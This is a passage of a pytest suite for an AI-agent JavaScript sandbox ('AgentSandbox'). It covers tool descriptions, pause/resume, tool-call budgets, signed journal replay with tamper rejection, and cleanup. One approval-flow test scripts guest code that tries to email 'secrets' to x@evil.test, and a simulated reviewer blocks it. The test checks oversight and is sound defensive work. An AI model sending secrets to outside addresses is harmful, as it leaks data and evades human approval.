"""`AgentSandbox`: tools, prompt helpers, session state, pause/resume, durable replay, cleanup.

The session is a thin layer over `IsolatedRuntime`'s public API, so most of what is tested here is
the layer's own contract: what the model is told (golden strings), what the caller sees at each
step, what a journal can and cannot be made to do, and that nothing the session started outlives it.
"""

from __future__ import annotations

import asyncio
import gc
import json
import os
import signal
import sqlite3
import subprocess
import sys
import threading
import time
import typing
from collections.abc import Mapping, Sequence
from datetime import datetime, timezone
from typing import Any, Literal, Optional, Union

import pytest

import pydeno._agent as agent_module
from pydeno import (
    JavaScriptError,
    RuntimeConfig,
    RuntimeTimeout,
    WorkerCrashed,
    undefined,
)
from pydeno._agent import (
    AgentSandbox,
    Done,
    Failed,
    JournalError,
    ReplayDivergence,
    ToolCall,
    _open,
    _seal,
    describe_tools,
    ts_type,
    typescript_stubs,
)
from pydeno._snapshot_auth import sign_snapshot

pytestmark = pytest.mark.full_sandbox

KEY = b"0123456789abcdef0123456789abcdef"
CLOCK = datetime(2026, 1, 2, 3, 4, 5, tzinfo=timezone.utc)


# ---------------------------------------------------------------------------
# tools used across the tests (module level, so string annotations resolve)
# ---------------------------------------------------------------------------


def query_rows(sql: str, params: dict[str, Any] | None = None) -> list[dict[str, Any]]:
    """Run a read-only SQL query against the orders table.

    Returns one dict per row."""
    return []


async def analyze_sentiment(text: str) -> float:
    """Score text from -1.0 (negative) to +1.0 (positive)."""
    return 0.0


def tag(*labels: str) -> bool:
    return True


def nothing():  # noqa: ANN201 - deliberately unannotated
    pass


def blob(data: bytes, when: datetime, mode: Literal["fast", "safe"] = "fast") -> None:
    """Store bytes. Comment-closer */ is escaped."""


def legacy(
    a: Optional[int],  # noqa: UP045 - the old spelling is the point
    b: Union[int, str],  # noqa: UP007
    c: typing.List[float],  # noqa: UP006
    d: typing.Dict[str, bool],  # noqa: UP006
) -> tuple[int, str]:
    return (1, "x")


def odd(
    default: int, x: Sequence[int | str], m: Mapping[int, str], t: tuple[int, ...]
) -> set[str]:
    return set()


SIGNATURE_TOOLS: dict[str, Any] = {
    "query_rows": query_rows,
    "analyze_sentiment": analyze_sentiment,
    "tag": tag,
    "nothing": nothing,
    "blob": blob,
    "legacy": legacy,
    "odd": odd,
    "lam": lambda x, y=2: x,
}


class Counter:
    """Tools that count how often they really ran."""

    def __init__(self) -> None:
        self.calls: list[tuple[str, tuple[Any, ...]]] = []

    def tools(self) -> dict[str, Any]:
        def add(a: int, b: int) -> int:
            """Add two numbers."""
            self.calls.append(("add", (a, b)))
            return a + b

        async def upper(text: str) -> str:
            self.calls.append(("upper", (text,)))
            await asyncio.sleep(0)
            return text.upper()

        def fail(reason: str) -> None:
            self.calls.append(("fail", (reason,)))
            raise ValueError(f"secret detail: {reason}")

        return {"add": add, "upper": upper, "fail": fail}


def session(tools: Mapping[str, Any] | None = None, **kwargs: Any) -> AgentSandbox:
    kwargs.setdefault("clock", CLOCK)
    kwargs.setdefault("random_seed", 7)
    return AgentSandbox(tools if tools is not None else Counter().tools(), **kwargs)


def reseal(blob_: bytes, edit: Any) -> bytes:
    """Open a journal, let `edit` change it, and sign it again with the same key: a journal that
    is authentic but does not match what the guest does (or a producer whose guest misbehaves)."""
    journal = json.loads(_open(blob_, KEY))
    edit(journal)
    return _seal(json.dumps(journal).encode(), KEY)


# ---------------------------------------------------------------------------
# prompt helpers (golden strings)
# ---------------------------------------------------------------------------

PREAMBLE = """\
You can run JavaScript in a sandbox. Write the code as the body of an async function:
call tools with `await` and `return` the final result. Top-level `const`, `let`, `var`,
`function` and `class` declarations written at the start of a line are kept for later
runs; to keep anything else, store it on `globalThis`. There is no network, filesystem,
`require` or `import`. `Date.now()` is frozen and `Math.random()` is seeded. A tool that
fails throws an Error whose `name` is the failure's type.
"""

GOLDEN_DESCRIBE = (
    PREAMBLE
    + """
These tools are available as global functions; each returns a Promise.

query_rows(sql: string, params?: Record<string, unknown> | null): Promise<Record<string, unknown>[]>
    Run a read-only SQL query against the orders table.

    Returns one dict per row.
    Example: const result = await query_rows("sql");

analyze_sentiment(text: string): Promise<number>
    Score text from -1.0 (negative) to +1.0 (positive).
    Example: const result = await analyze_sentiment("text");

tag(...labels: string[]): Promise<boolean>
    Example: const result = await tag();

nothing(): Promise<unknown>
    Example: const result = await nothing();

blob(data: Uint8Array, when: Date, mode?: "fast" | "safe"): Promise<null>
    Store bytes. Comment-closer */ is escaped.
    Example: const result = await blob(new Uint8Array([1, 2, 3]), new Date());

legacy(a: number | null, b: number | string, c: number[], d: Record<string, boolean>): Promise<[number, string]>
    Example: const result = await legacy(1, 1, [], {});

odd(default_: number, x: (number | string)[], m: unknown, t: number[]): Promise<Set<string>>
    Example: const result = await odd(1, [], null, []);

lam(x: unknown, y?: unknown): Promise<unknown>
    Example: const result = await lam(null);
"""
)

GOLDEN_STUBS = """\
// Tools provided by the host. Every call returns a Promise.

/**
 * Run a read-only SQL query against the orders table.
 *
 * Returns one dict per row.
 */
declare function query_rows(sql: string, params?: Record<string, unknown> | null): Promise<Record<string, unknown>[]>;
/**
 * Score text from -1.0 (negative) to +1.0 (positive).
 */
declare function analyze_sentiment(text: string): Promise<number>;
declare function tag(...labels: string[]): Promise<boolean>;
declare function nothing(): Promise<unknown>;
/**
 * Store bytes. Comment-closer *\\/ is escaped.
 */
declare function blob(data: Uint8Array, when: Date, mode?: "fast" | "safe"): Promise<null>;
declare function legacy(a: number | null, b: number | string, c: number[], d: Record<string, boolean>): Promise<[number, string]>;
declare function odd(default_: number, x: (number | string)[], m: unknown, t: number[]): Promise<Set<string>>;
declare function lam(x: unknown, y?: unknown): Promise<unknown>;
"""

GOLDEN_NAMESPACED_STUBS = """\
// Tools provided by the host. Every call returns a Promise.

declare namespace tools {
  /**
   * Run a read-only SQL query against the orders table.
   *
   * Returns one dict per row.
   */
  function query_rows(sql: string, params?: Record<string, unknown> | null): Promise<Record<string, unknown>[]>;
  function tag(...labels: string[]): Promise<boolean>;
}
"""


class TestPromptHelpers:
    def test_describe_tools_golden(self) -> None:
        assert describe_tools(SIGNATURE_TOOLS) == GOLDEN_DESCRIBE

    def test_typescript_stubs_golden(self) -> None:
        assert typescript_stubs(SIGNATURE_TOOLS) == GOLDEN_STUBS

    def test_namespaced_stubs_and_description(self) -> None:
        tools = {"query_rows": query_rows, "tag": tag}
        assert typescript_stubs(tools, namespace="tools") == GOLDEN_NAMESPACED_STUBS
        text = describe_tools({"query_rows": query_rows}, namespace="tools")
        assert "These tools are available on the `tools` object" in text
        assert "tools.query_rows(sql: string" in text
        assert 'Example: const result = await tools.query_rows("sql");' in text

    @pytest.mark.parametrize(
        ("annotation", "expected"),
        [
            (int, "number"),
            (float, "number"),
            (str, "string"),
            (bool, "boolean"),
            (bytes, "Uint8Array"),
            (bytearray, "Uint8Array"),
            (None, "null"),
            (type(None), "null"),
            (Any, "unknown"),
            (datetime, "Date"),
            (list[int], "number[]"),
            (list, "unknown[]"),
            (list[list[str]], "string[][]"),
            (list[int | None], "(number | null)[]"),
            (dict[str, int], "Record<string, number>"),
            (dict, "Record<string, unknown>"),
            (dict[str, list[bool]], "Record<string, boolean[]>"),
            (dict[int, str], "unknown"),
            (Optional[str], "string | null"),  # noqa: UP045
            (Union[int, str, None], "number | string | null"),  # noqa: UP007
            (None | int, "number | null"),
            (int | Any, "unknown"),
            (Literal["a", 1, True, None], '"a" | 1 | true | null'),
            (tuple[int, str], "[number, string]"),
            (tuple[int, ...], "number[]"),
            (set[int], "Set<number>"),
            (frozenset[str], "Set<string>"),
            (Sequence[float], "number[]"),
            (Mapping[str, Any], "Record<string, unknown>"),
            (typing.Annotated[int, "meta"], "number"),
            (object, "unknown"),
            (complex, "unknown"),
            (Counter, "unknown"),
        ],
        ids=lambda v: repr(v)[:60],
    )
    def test_type_mapping(self, annotation: Any, expected: str) -> None:
        assert ts_type(annotation) == expected

    def test_session_methods_match_module_functions(self) -> None:
        tools = Counter().tools()
        with session(tools) as s:
            assert s.describe_tools() == describe_tools(tools)
            assert s.typescript_stubs() == typescript_stubs(tools)
            assert "declare function add(a: number, b: number): Promise<number>;" in (
                s.typescript_stubs()
            )


class TestConstruction:
    @pytest.mark.parametrize(
        "name", ["1bad", "has-dash", "__proto__", "constructor", "", "a b"]
    )
    def test_tool_names_are_checked_like_toolbridge(self, name: str) -> None:
        with pytest.raises(ValueError):
            AgentSandbox({name: lambda: 1})

    def test_rejections(self) -> None:
        with pytest.raises(TypeError):
            AgentSandbox({"x": 1})  # type: ignore[dict-item]
        with pytest.raises(TypeError):
            AgentSandbox([("x", len)])  # type: ignore[arg-type]

        def kw_only(*, needed: int) -> int:
            return needed

        with pytest.raises(ValueError, match="keyword-only"):
            AgentSandbox({"kw_only": kw_only})
        with pytest.raises(TypeError, match="sets"):
            AgentSandbox({}, request_timeout=5)
        with pytest.raises(ValueError, match=r"RuntimeConfig\.timeout"):
            AgentSandbox({}, config=RuntimeConfig(timeout=1.0))
        with pytest.raises(ValueError):
            AgentSandbox({}, max_tool_calls=-1)
        with pytest.raises(ValueError):
            AgentSandbox({}, namespace="not ok")

    def test_clock_is_frozen_and_seed_recorded(self) -> None:
        with session(clock=CLOCK, random_seed=11) as s:
            first = s.run(
                "return [Date.now(), new Date().toISOString(), Math.random()]"
            )
            second = s.run("return Date.now()")
            assert first[0] == second == int(CLOCK.timestamp() * 1000)
            assert first[1] == "2026-01-02T03:04:05.000Z"
            assert s.clock == CLOCK
            assert s.random_seed == 11
        with session(clock=CLOCK, random_seed=11) as again:
            assert again.run("return Math.random()") == first[2]

    def test_defaults_freeze_now_and_pick_a_seed(self) -> None:
        before = datetime.now(timezone.utc)
        with AgentSandbox({}) as s:
            assert before.timestamp() - 1 <= s.clock.timestamp() <= time.time() + 1
            assert isinstance(s.random_seed, int)
            assert s.run("return Date.now()") == s.run("return Date.now()")


# ---------------------------------------------------------------------------
# state, results, errors
# ---------------------------------------------------------------------------


class TestSessionState:
    def test_top_level_declarations_persist(self) -> None:
        with session() as s:
            assert (
                s.run(
                    "const base = 40\n"
                    "let count = 1\n"
                    "var label = 'x'\n"
                    "function twice(n) { return n * 2 }\n"
                    "async function plus(n) { return await add(n, base) }\n"
                    "class Box { constructor(v) { this.v = v } }\n"
                    "return base + 2"
                )
                == 42
            )
            assert s.run(
                "return [base, count, label, twice(4), await plus(2), new Box(3).v]"
            ) == [40, 1, "x", 8, 42, 3]

    def test_globalthis_and_redeclaration(self) -> None:
        with session() as s:
            s.run("globalThis.rows = [1, 2, 3]; const n = 1")
            s.run("const n = 2")  # a later run may redeclare: it is a new function body
            assert s.run("return [rows.length, n]") == [3, 2]

    def test_indented_declarations_stay_local(self) -> None:
        with session() as s:
            s.run("if (true) {\n  const hidden = 1\n}\nconst shown = 2")
            assert s.run("return [typeof hidden, shown]") == ["undefined", 2]

    def test_result_values(self) -> None:
        with session() as s:
            assert s.run("1 + 1") is undefined  # no `return`: the body returns nothing
            assert s.run("return null") is None
            assert s.run("return {a: [1, 'b', true], n: 2n ** 70n}") == {
                "a": [1, "b", True],
                "n": 2**70,
            }
            assert s.run("return new Uint8Array([1, 2])") == b"\x01\x02"

    def test_a_javascript_error_fails_the_run_not_the_session(self) -> None:
        with session() as s:
            step = s.start("const z = 1\nthrow new TypeError('nope')")
            assert isinstance(step, Failed)
            assert isinstance(step.error, JavaScriptError)
            assert "nope" in str(step.error)
            with pytest.raises(JavaScriptError):
                s.run("return missing_name")
            assert not s.is_closed()
            assert s.run("return z") == 1  # the failed run still kept its declaration

    def test_a_syntax_error_is_a_failed_run(self) -> None:
        with session() as s:
            step = s.start("return )")
            assert isinstance(step, Failed)
            assert "SyntaxError" in str(step.error)
            assert s.run("return 3") == 3


# ---------------------------------------------------------------------------
# pause / resume
# ---------------------------------------------------------------------------


class TestPauseResume:
    def test_resume_with_a_value(self) -> None:
        counter = Counter()
        with session(counter.tools()) as s:
            step = s.start("const r = await add(2, 3); return r * 10")
            assert isinstance(step, ToolCall)
            assert (step.name, step.args) == ("add", (2, 3))
            assert s.pending is step
            done = s.resume(step, 7)  # the caller decides the answer, not the tool
            assert done == Done(70)
            assert s.pending is None
            assert counter.calls == []  # start/resume never call the real tool

    def test_resume_with_an_error_is_redacted_by_default(self) -> None:
        with session() as s:
            step = s.start(
                "try { await upper('x') } catch (e) { return [e.name, e.message] }"
            )
            assert isinstance(step, ToolCall)
            done = s.resume(step, error=ValueError("internal path /srv/x"))
            assert done == Done(["ValueError", "host function failed"])

    def test_resume_with_an_error_unredacted(self) -> None:
        with session(redact_host_errors=False) as s:
            step = s.start(
                "try { await upper('x') } catch (e) { return [e.name, e.message] }"
            )
            assert isinstance(step, ToolCall)
            assert s.resume(step, error=KeyError("k")) == Done(["KeyError", "'k'"])

    def test_concurrent_calls_come_one_at_a_time_in_call_order(self) -> None:
        with session() as s:
            step = s.start(
                "return await Promise.all([add(1, 2), upper('a'), add(3, 4)])"
            )
            seen = []
            while isinstance(step, ToolCall):
                seen.append((step.name, step.args))
                step = s.resume(step, len(seen))
            assert seen == [("add", (1, 2)), ("upper", ("a",)), ("add", (3, 4))]
            assert step == Done([1, 2, 3])

    def test_a_call_the_code_did_not_await_is_still_answered_before_the_run_ends(
        self,
    ) -> None:
        counter = Counter()
        with session(counter.tools(), timeout=5) as s:
            for i in range(10):
                assert s.run(f"add({i}, 1); return {i}") == i
                step = s.start("upper('fire and forget'); return 'ok'")
                assert isinstance(step, ToolCall)
                assert s.resume(step, "x") == Done("ok")
            assert s.run("return 1 + 1") == 2
            assert len(counter.calls) == 10

    def test_rejected_promise_all_waits_for_the_other_calls(self) -> None:
        with session(timeout=5) as s:
            code = (
                "try { await Promise.all([add(1, 2), Promise.reject(new Error('boom'))]) }"
                " catch (e) { return e.message }"
            )
            assert s.run(code) == "boom"
            assert s.run("return 5") == 5

    def test_misuse(self) -> None:
        with session() as s, session() as other:
            step = s.start("return await add(1, 2)")
            assert isinstance(step, ToolCall)
            with pytest.raises(RuntimeError, match="paused"):
                s.start("return 1")
            with pytest.raises(TypeError, match="exactly one"):
                s.resume(step)
            with pytest.raises(TypeError, match="exactly one"):
                s.resume(step, 1, error=ValueError())
            with pytest.raises(TypeError):
                s.resume(Done(1))  # type: ignore[arg-type]
            with pytest.raises(TypeError, match="cannot cross"):
                s.resume(step, object())
            other_step = other.start("return await add(1, 2)")
            assert isinstance(other_step, ToolCall)
            with pytest.raises(RuntimeError, match="not the one"):
                s.resume(other_step, 1)
            # still paused, and still answerable after every refusal
            assert s.resume(step, 3) == Done(3)
            with pytest.raises(RuntimeError, match="not the one"):
                s.resume(step, 3)  # a step answers once
            assert other.resume(other_step, 4) == Done(4)

    def test_approval_flow_denies_a_tool(self) -> None:
        sent: list[str] = []

        def send_email(to: str, body: str) -> str:
            """Send an email. Needs human approval."""
            sent.append(to)
            return "sent"

        def lookup(customer: str) -> str:
            return f"{customer}@example.com"

        tools = {"send_email": send_email, "lookup": lookup}
        needs_approval = {"send_email"}

        def approve(call: ToolCall) -> bool:  # the "human": deny mail to outsiders
            return str(call.args[0]).endswith("@example.com")

        code = """
const to = await lookup('ada')
let outcome
try { outcome = await send_email(to, 'hi') } catch (e) { outcome = 'denied: ' + e.name }
const leak = await (async () => { try { return await send_email('x@evil.test', 'secrets') }
                                  catch (e) { return e.name } })()
return [outcome, leak]
"""
        with session(tools) as s:
            step = s.start(code)
            log = []
            while isinstance(step, ToolCall):
                log.append(step.name)
                if step.name in needs_approval and not approve(step):
                    step = s.resume(step, error=PermissionError("denied by reviewer"))
                else:
                    step = s.resume(step, tools[step.name](*step.args))
            assert step == Done(["sent", "PermissionError"])
            assert log == ["lookup", "send_email", "send_email"]
            assert sent == ["ada@example.com"]


# ---------------------------------------------------------------------------
# run(): the real tools
# ---------------------------------------------------------------------------


class TestRunWithRealTools:
    def test_sync_and_async_tools(self) -> None:
        counter = Counter()
        with session(counter.tools()) as s:
            assert s.run("return [await add(1, 2), await upper('hi')]") == [3, "HI"]
            assert counter.calls == [("add", (1, 2)), ("upper", ("hi",))]
            assert s.calls_made == 2

    def test_tool_errors_reach_the_guest_redacted(self) -> None:
        with session() as s:
            got = s.run(
                "try { await fail('db password') } catch (e) { return [e.name, e.message] }"
            )
            assert got == ["ValueError", "host function failed"]
            with pytest.raises(JavaScriptError, match="ValueError"):
                s.run("await fail('x')")

    def test_wrong_arity_is_the_guests_problem(self) -> None:
        with session() as s:
            assert (
                s.run("try { await add(1) } catch (e) { return e.name }") == "TypeError"
            )

    def test_unencodable_tool_result_is_a_guest_side_type_error(self) -> None:
        with session({"bad": lambda: object()}) as s:
            assert (
                s.run("try { await bad() } catch (e) { return e.name }") == "TypeError"
            )

    def test_a_tool_cannot_drive_its_own_session(self) -> None:
        holder: dict[str, AgentSandbox] = {}

        def reenter() -> int:
            return holder["s"].run("return 1")

        with session({"reenter": reenter}) as s:
            holder["s"] = s
            assert (
                s.run("try { await reenter() } catch (e) { return e.name }")
                == "RuntimeError"
            )
            assert s.run("return 2") == 2

    def test_namespace(self) -> None:
        with session(namespace="tools") as s:
            assert s.run("return [typeof add, await tools.add(2, 2)]") == [
                "undefined",
                4,
            ]


class TestBudget:
    def test_budget_counts_across_start_resume_and_runs(self) -> None:
        counter = Counter()
        with session(counter.tools(), max_tool_calls=3) as s:
            assert s.calls_remaining == 3
            step = s.start("return await add(1, 1)")
            assert isinstance(step, ToolCall)
            assert s.calls_made == 1
            assert s.resume(step, 2) == Done(2)
            assert s.run("return await add(2, 2)") == 4
            code = (
                "const out = []\n"
                "for (let i = 0; i < 3; i++) {\n"
                "  try { out.push(await add(i, i)) } catch (e) { out.push(e.name) }\n"
                "}\n"
                "return out"
            )
            assert s.run(code) == [0, "ToolBudgetError", "ToolBudgetError"]
            assert s.calls_made == 3
            assert s.calls_remaining == 0
            assert (
                len(counter.calls) == 2
            )  # the resumed call was answered by the caller
            # A refused call never reaches the caller as a ToolCall.
            assert s.start(
                "try { await add(9, 9) } catch (e) { return e.name }"
            ) == Done("ToolBudgetError")


# ---------------------------------------------------------------------------
# durability
# ---------------------------------------------------------------------------


class TestDurability:
    def test_round_trip_then_continue(self) -> None:
        counter = Counter()
        with session(counter.tools(), max_tool_calls=10) as s:
            s.run(
                "const greeting = await upper('hello')\nfunction greet(n) { return greeting + ' ' + n }"
            )
            s.run("globalThis.total = (await add(1, 2)) + (await add(3, 4))")
            blob_ = s.dump(KEY)
            original_next_random = s.run("return Math.random()")
        made = len(counter.calls)

        with AgentSandbox.load(blob_, KEY, counter.tools()) as restored:
            assert len(counter.calls) == made  # replay never called a real tool
            assert restored.calls_made == 3
            assert restored.calls_remaining == 7
            assert restored.clock == CLOCK
            assert restored.run("return [greet('ada'), total]") == ["HELLO ada", 10]
            # Same seed, same history: the random stream continues exactly where it was.
            assert restored.run("return Math.random()") == original_next_random

    def test_dump_while_paused_restores_the_pause(self) -> None:
        with session() as s:
            s.run("const k = 3")
            step = s.start("const r = await add(k, 4)\nreturn r * 2")
            assert isinstance(step, ToolCall)
            blob_ = s.dump(KEY)

        counter = Counter()
        restored = AgentSandbox.load(blob_, KEY, counter.tools())
        try:
            pending = restored.pending
            assert isinstance(pending, ToolCall)
            assert (pending.name, pending.args) == ("add", (3, 4))
            # Approved hours later, in another process: the real answer goes in now.
            assert restored.resume(pending, 7) == Done(14)
            assert restored.run("return [k, r]") == [3, 7]
            again = AgentSandbox.load(restored.dump(KEY), KEY, counter.tools())
            again.close()
        finally:
            restored.close()
        assert counter.calls == []

    def test_errors_in_the_journal_replay(self) -> None:
        with session() as s:
            s.run(
                "globalThis.seen = await (async () => { try { await fail('pw') } catch (e) { return e.name } })()"
            )
            step = s.start("try { await add(1, 1) } catch (e) { return e.name }")
            assert isinstance(step, ToolCall)
            s.resume(step, error=PermissionError("no"))
            blob_ = s.dump(KEY)
        # A redacted error's text never reaches the blob, only its class name.
        assert b"secret detail" not in _open(blob_, KEY)
        with AgentSandbox.load(blob_, KEY, Counter().tools()) as restored:
            assert restored.run("return seen") == "ValueError"

    def test_replay_never_calls_the_real_tools(self) -> None:
        counter = Counter()
        with session(counter.tools()) as s:
            for i in range(5):
                s.run(f"await add({i}, {i}); await upper('x{i}')")
            blob_ = s.dump(KEY)
        spy = Counter()
        with AgentSandbox.load(blob_, KEY, spy.tools()) as restored:
            assert spy.calls == []
            assert restored.calls_made == 10

    def test_divergence_when_a_recorded_tool_result_changes(self) -> None:
        with session() as s:
            s.run("globalThis.x = (await add(1, 2)) * 10")
            assert s.run("return x") == 30
            blob_ = s.dump(KEY)

        def change_answer(journal: dict[str, Any]) -> None:
            answers = [r for r in journal["records"] if r[0] == "ans"]
            assert answers[0][2] == 3
            answers[0][2] = 4

        with pytest.raises(ReplayDivergence, match="diverged"):
            AgentSandbox.load(reseal(blob_, change_answer), KEY, Counter().tools())

    def test_divergence_when_recorded_code_changes(self) -> None:
        with session() as s:
            s.run("return 1")
            blob_ = s.dump(KEY)

        def change_code(journal: dict[str, Any]) -> None:
            journal["records"][0][1] = "return 2"

        with pytest.raises(ReplayDivergence):
            AgentSandbox.load(reseal(blob_, change_code), KEY, Counter().tools())

    def test_divergence_when_the_environment_differs(self) -> None:
        # Nondeterminism the session does not control (here: a different bootstrap) is detected,
        # not prevented.
        with session(config=RuntimeConfig(bootstrap="globalThis.salt = 1")) as s:
            s.run("return salt")
            blob_ = s.dump(KEY)
        with pytest.raises(ReplayDivergence):
            AgentSandbox.load(
                blob_,
                KEY,
                Counter().tools(),
                config=RuntimeConfig(bootstrap="globalThis.salt = 2"),
            )

    def test_divergence_closes_the_replaying_session(
        self, baseline: dict[str, int]
    ) -> None:
        with session() as s:
            s.run("return 1")
            blob_ = s.dump(KEY)
        bad = reseal(blob_, lambda j: j["records"][0].__setitem__(1, "return 2"))
        for _ in range(3):
            with pytest.raises(ReplayDivergence):
                AgentSandbox.load(bad, KEY, Counter().tools())
        _assert_back_to_baseline(baseline, "3 divergent loads")

    def test_tampered_or_wrongly_keyed_blobs_are_rejected_before_any_code_runs(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        with session() as s:
            s.run("return 1")
            blob_ = s.dump(KEY)

        def no_runtime(*_a: Any, **_k: Any) -> Any:
            raise AssertionError("a runtime was created for an unauthenticated journal")

        monkeypatch.setattr(agent_module, "IsolatedRuntime", no_runtime)
        flipped = bytearray(blob_)
        flipped[-5] ^= 0x01
        candidates = {
            "flipped": bytes(flipped),
            "truncated": blob_[:-1],
            "extended": blob_ + b" ",
            "mac only": blob_[: len(agent_module._MAGIC) + 32],  # noqa: SLF001
            "empty": b"",
            "snapshot under the same key": sign_snapshot(_open(blob_, KEY), KEY),
        }
        for name, candidate in candidates.items():
            with pytest.raises(JournalError):
                AgentSandbox.load(candidate, KEY, Counter().tools())
                pytest.fail(f"{name} was accepted")
        with pytest.raises(JournalError, match="authentication"):
            AgentSandbox.load(
                blob_, b"another key of 32 bytes........", Counter().tools()
            )
        with pytest.raises(ValueError):
            AgentSandbox.load(blob_, b"short", Counter().tools())

    def test_tool_names_must_match_the_journal(self) -> None:
        with session() as s:
            blob_ = s.dump(KEY)
        with pytest.raises(JournalError, match="recorded with tools"):
            AgentSandbox.load(blob_, KEY, {"add": lambda a, b: a + b})

    def test_malformed_but_authentic_journal_is_rejected(self) -> None:
        for payload in (
            b"not json",
            b"[]",
            b'{"format": 99}',
            b'{"format":1,"config":{},"records":[]}',
        ):
            with pytest.raises(JournalError):
                AgentSandbox.load(_seal(payload, KEY), KEY, Counter().tools())
        with session() as s:
            s.run("return 1")
            blob_ = s.dump(KEY)
        with pytest.raises(JournalError):
            # an outcome with no input before it
            AgentSandbox.load(
                reseal(blob_, lambda j: j["records"].pop(0)), KEY, Counter().tools()
            )

    def test_journal_size_is_bounded(self) -> None:
        with session(max_journal_bytes=300) as s:
            s.run("return 1")
            s.dump(KEY)
            s.run("/* " + "x" * 400 + " */ return 2")
            assert s.run("return 3") == 3  # the session keeps working
            with pytest.raises(JournalError, match="max_journal_bytes"):
                s.dump(KEY)
        with session() as s:
            s.run("/* " + "y" * 5000 + " */ return 1")
            big = s.dump(KEY)
        with pytest.raises(JournalError, match="larger"):
            AgentSandbox.load(big, KEY, Counter().tools(), max_journal_bytes=100)


# ---------------------------------------------------------------------------
# failure, cleanup, isolation between sessions
# ---------------------------------------------------------------------------


def _child_pids() -> set[int]:
    me = os.getpid()
    if sys.platform.startswith("linux"):
        out = set()
        for entry in os.listdir("/proc"):
            if not entry.isdigit():
                continue
            try:
                with open(f"/proc/{entry}/stat", "rb") as fh:
                    rest = fh.read().rsplit(b")", 1)[1].split()
            except OSError:
                continue
            if int(rest[1]) == me:
                out.add(int(entry))
        return out
    done = subprocess.run(
        ["ps", "-A", "-o", "pid=,ppid="], capture_output=True, text=True, check=True
    )
    return {
        int(a)
        for a, b in (ln.split() for ln in done.stdout.splitlines())
        if int(b) == me
    }


def _snapshot() -> dict[str, int]:
    return {
        "children": len(_child_pids()),
        "fds": len(os.listdir("/dev/fd")),
        "threads": threading.active_count(),
    }


def _settle() -> None:
    gc.collect()
    time.sleep(0.4)  # a spare worker finishing its start-up, a killed one being reaped
    gc.collect()


@pytest.fixture
def baseline() -> dict[str, int]:
    # One session first, so the prewarmed spare worker and lazily created threads already exist.
    with session() as s:
        s.run("return await add(1, 1)")
    _settle()
    return _snapshot()


def _assert_back_to_baseline(before: dict[str, int], what: str) -> None:
    deadline = time.monotonic() + 5
    while True:
        _settle()
        after = _snapshot()
        ok = (
            after["children"] <= before["children"]
            and after["fds"] <= before["fds"] + 3
            and after["threads"] <= before["threads"] + 1
        )
        if ok or time.monotonic() > deadline:
            break
    assert after["children"] <= before["children"], (what, before, after)
    assert after["fds"] <= before["fds"] + 3, (what, before, after)
    assert after["threads"] <= before["threads"] + 1, (what, before, after)


def _worker_pid(s: AgentSandbox) -> int:
    return s._core.rt._proc.pid  # noqa: SLF001 - the point of the test


class TestFailureAndCleanup:
    def test_worker_killed_mid_pause_gives_failed_and_cleans_up(
        self, baseline: dict[str, int]
    ) -> None:
        for _ in range(3):
            s = session()
            step = s.start("return await add(1, 2)")
            assert isinstance(step, ToolCall)
            os.kill(_worker_pid(s), signal.SIGKILL)  # a worker this test started
            after = s.resume(step, 3)
            assert isinstance(after, Failed)
            assert isinstance(after.error, WorkerCrashed)
            assert s.is_closed()
            assert not s._core.thread.is_alive()  # noqa: SLF001 - released without close()
            with pytest.raises(RuntimeError, match="gone"):
                s.run("return 1")
            # The journal as of the last good run (none here): the crashed run is left out.
            # (Loading it is covered in tests/test_agent_journal_recovery.py.)
            assert s.dump(KEY).startswith(b"pydeno-agent2\x00")
            s.close()
        _assert_back_to_baseline(baseline, "3 crashes mid-pause")

    def test_closing_mid_pause_cleans_up(self, baseline: dict[str, int]) -> None:
        for _ in range(4):
            s = session()
            step = s.start("return await add(1, 2)")
            assert isinstance(step, ToolCall)
            s.close()
            assert s.is_closed()
            with pytest.raises(RuntimeError, match="closed"):
                s.resume(step, 3)
            s.close()  # idempotent
        _assert_back_to_baseline(baseline, "4 closes mid-pause")

    def test_a_session_dropped_mid_pause_is_reaped(
        self, baseline: dict[str, int]
    ) -> None:
        for _ in range(4):
            s = session()
            assert isinstance(s.start("return await upper('x')"), ToolCall)
            del s
        _assert_back_to_baseline(baseline, "4 sessions dropped while paused")

    def test_never_resumed_session_times_out_and_releases_the_worker(self) -> None:
        with session(max_pause=0.5) as s:
            step = s.start("return await add(1, 2)")
            assert isinstance(step, ToolCall)
            deadline = time.monotonic() + 10
            while not s._core.rt.is_closed() and time.monotonic() < deadline:  # noqa: SLF001
                time.sleep(0.05)
            after = s.resume(step, 3)
            assert isinstance(after, Failed)
            assert isinstance(after.error, RuntimeTimeout)
            assert s.is_closed()

    def test_a_run_over_its_timeout_fails_and_closes_the_session(self) -> None:
        with session(timeout=1.0) as s:
            step = s.start("while (true) {}")
            assert isinstance(step, Failed)
            assert isinstance(step.error, RuntimeTimeout)
            assert s.is_closed()

    def test_time_paused_at_a_tool_does_not_count_against_the_timeout(self) -> None:
        with session(timeout=1.0) as s:
            step = s.start("return await add(1, 2)")
            assert isinstance(step, ToolCall)
            time.sleep(1.5)
            assert s.resume(step, 3) == Done(3)

    def test_many_sessions_leave_nothing_behind(self, baseline: dict[str, int]) -> None:
        for i in range(12):
            s = session()
            assert s.run(f"return await add({i}, 1)") == i + 1
            if i % 3 == 0:
                assert isinstance(s.start("return await add(1, 1)"), ToolCall)
            if i % 4 == 0:
                del s  # dropped, paused or not
                continue
            s.close()
        _assert_back_to_baseline(baseline, "12 sessions")


class TestIsolationBetweenSessions:
    def test_two_sessions_in_parallel_do_not_interfere(self) -> None:
        errors: list[BaseException] = []
        results: dict[str, list[Any]] = {"a": [], "b": []}

        def drive(label: str, offset: int) -> None:
            try:
                with session() as s:
                    s.run(f"const mine = '{label}'")
                    for i in range(15):
                        step = s.start(f"return [mine, await add({i}, {offset})]")
                        assert isinstance(step, ToolCall), step
                        assert step.args == (i, offset)
                        step = s.resume(step, i + offset)
                        assert isinstance(step, Done), step
                        results[label].append(step.value)
            except BaseException as exc:  # noqa: BLE001
                errors.append(exc)

        threads = [
            threading.Thread(target=drive, args=("a", 100)),
            threading.Thread(target=drive, args=("b", 200)),
        ]
        for t in threads:
            t.start()
        for t in threads:
            t.join(120)
        assert errors == []
        assert results["a"] == [["a", i + 100] for i in range(15)]
        assert results["b"] == [["b", i + 200] for i in range(15)]

    def test_globals_are_per_session(self) -> None:
        with session() as a, session() as b:
            a.run("globalThis.secret = 'a-only'\nconst also = 1")
            assert b.run("return [typeof secret, typeof also]") == [
                "undefined",
                "undefined",
            ]

    def test_one_session_cannot_be_used_from_two_threads_at_once(self) -> None:
        gate = threading.Event()

